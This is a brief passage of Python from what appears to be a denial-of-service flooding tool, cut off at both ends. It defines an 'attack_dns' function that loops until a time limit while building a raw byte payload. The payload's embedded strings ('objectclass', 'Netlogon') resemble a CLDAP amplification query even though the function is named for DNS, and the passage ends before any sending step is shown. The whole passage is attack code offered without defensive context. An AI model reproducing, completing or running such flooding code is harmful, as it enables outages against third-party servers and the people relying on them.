...
def attack_dns(ip, port, secs):
    while time.time() < secs:
        query =  b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a'
        query += b'\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01'
        query += b'\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65'
        query += b'\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00'
        query += b'\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e'
        query += b'\x65\x74\x6c\x6f\x67\x6f\x6e'
